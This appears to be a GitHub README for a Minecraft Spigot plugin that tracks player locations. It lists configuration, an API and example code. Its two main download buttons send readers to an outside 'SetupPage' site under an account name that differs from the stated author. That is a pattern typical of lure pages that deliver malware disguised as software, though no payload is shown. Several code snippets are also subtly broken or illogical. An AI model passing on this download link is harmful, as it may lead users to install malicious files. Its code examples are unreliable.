# Minecraft‑Player‑Location‑Tracker  
*Real‑time player positioning with full configuration control*  

---  

## 🎮 What is this?

**Minecraft‑Player‑Location‑Tracker** is a lightweight Spigot plugin that continuously monitors every player’s coordinates, world, and dimension. It writes the data to a configurable store (flat file, MySQL, SQLite) and provides an in‑game API for other plugins to react to location changes instantly.

> **Why use it?**  
> • Build dynamic events (e.g., “spawn a dragon when a player enters the Nether”).  
> • Generate heat‑maps for server analytics.  
> • Create custom teleport‑guards, region alerts, or live dashboards for moderators.  

---

## 🚀 Quick Start (One‑Click)

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/▶️%20Download%20%26%20Setup-Now%20Go%20Here-4CAF50?style=for-the-badge&logo=github" alt="Download & Release"></a>
</div>

1. Click the button above.  
2. Download the latest `Minecraft-Player-Location-Tracker.jar`.  
3. Drop the JAR into your server’s `plugins/` folder.  
4. Restart or reload the server – the plugin creates a default `config.yml`.  

---

## 📂 Repository Layout

```
Minecraft-Player-Location-Tracker/
├─ src/
│   └─ main/java/com/gigahokagepincers/locationtracker/
│       ├─ LocationTracker.java          ← core listener & scheduler
│       ├─ ConfigManager.java            ← loads & validates config.yml
│       └─ StorageHandler.java           ← abstract DB/flat‑file logic
├─ resources/
│   └─ config.yml                        ← default settings (editable)
├─ plugin.yml                            ← Spigot meta‑data
└─ README.md
```

---

## 🛠️ Configurable Settings  

All options are stored in `config.yml`. Below is a concise utility‑sheet; the full file contains comments and examples.

| Setting | Description | Default |
|---------|-------------|---------|
| `storage.type` | `FLAT`, `SQLITE`, or `MYSQL` | `FLAT` |
| `storage.file` | Path for flat‑file storage (relative to plugin folder) | `player_locations.yml` |
| `mysql.host` / `port` / `database` / `user` / `password` | MySQL connection details (ignored unless `MYSQL`) | — |
| `update-interval-ticks` | How often (in server ticks) to write a player’s location | `100` (5 seconds) |
| `track-worlds` | List of world names to include/exclude | `["world","world_nether","world_the_end"]` |
| `log-to-console` | Toggle console logging of position updates | `true` |
| `api.enabled` | Expose a simple Bukkit API for other plugins | `true` |
| `api.permission` | Permission node required to query the API | `locationtracker.use` |

*Tip:* After editing `config.yml`, run `/lt reload` in‑game to apply changes without a full server restart.

---

## 📡 API Overview  

If `api.enabled` is true, other plugins can access the tracker via:

```java
LocationTrackerAPI api = Bukkit.getServicesManager().load(LocationTrackerAPI.class);
Location loc = api.getCurrentLocation(Player player);
boolean isInWorld(Player player, String worldName);
```

All API calls are thread‑safe and execute instantly thanks to the internal caching layer.

---

## 🧩 Example Use‑Cases  

### 1️⃣ Teleport Guard  

```java
@EventHandler
public void onPlayerMove(PlayerMoveEvent e) {
    if (!LocationTrackerAPI.getInstance().isInWorld(e.getPlayer(), "world_nether")) return;
    // Prevent entering the Nether unless they have a permission
    if (!e.getPlayer().hasPermission("myplugin.enter_nether")) {
        e.setCancelled(true);
        e.getPlayer().sendMessage("§cYou may not enter the Nether yet!");
    }
}
```

### 2️⃣ Live Heat‑Map (Web Dashboard)  

Export the stored locations to a CSV file every hour, then feed it to a simple Node/React visualizer. The plugin already provides a `/lt exportcsv` command.

### 3️⃣ Alert System  

```java
Bukkit.getScheduler().runTaskTimer(plugin, () -> {
    for (Player p : Bukkit.getOnlinePlayers()) {
        if (LocationTrackerAPI.getInstance().isInWorld(p, "world_the_end")) {
            Bukkit.broadcastMessage("⚔️ " + p.getName() + " has entered The End!");
        }
    }
}, 0L, 200L); // every 10 seconds
```

---

## 📈 Performance & Compatibility  

* **Lightweight:** Runs a single asynchronous task per `update-interval-ticks`.  
* **Thread‑safe:** All DB writes happen off the main thread.  
* **Spigot 1.12 – 1.21** (tested on the latest releases).  
* **No hard dependencies** – optional MySQL driver is shaded only when needed.

---

## 🐞 Troubleshooting  

| Symptom | Likely Cause | Fix |
|---------|--------------|-----|
| No data appears in the storage file | `update-interval-ticks` set too high or `log-to-console` disabled | Lower the interval or enable console logging to verify updates |
| Server crashes on startup | Invalid YAML syntax in `config.yml` | Run `/lt validateconfig` or restore the default file |
| MySQL connection errors | Wrong credentials or missing JDBC driver | Verify settings, ensure `mysql-connector-java` is present in `plugins/` |

Use `/lt info` to dump the current runtime configuration to the console for quick diagnostics.

---

## 📜 License  

Distributed under the **MIT License** – feel free to fork, modify, and share. See `LICENSE` for details.

---

## 🙌 Contributing  

1. Fork the repository.  
2. Create a feature branch (`git checkout -b feature/awesome‑feature`).  
3. Follow the existing code style (Google Java Format).  
4. Submit a Pull Request with a clear description and, if applicable, update the documentation.

All contributions are welcome, especially:

* New storage back‑ends (e.g., PostgreSQL, Redis).  
* Additional API methods.  
* Performance benchmarks for high‑population servers.

---

## 📞 Contact & Support  

- **Author:** gigahokagepincers  
- **Discord:** `@Gigahokage#7421` (plugin‑support channel)  
- **Issues:** Use the GitHub *Issues* tab for bugs or feature requests.  

---

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/🚀%20Get%20Started%20Now-Visit%20Setup%20Page-2196F3?style=for-the-badge&logo=githubactions" alt="Get Started"></a>
</div>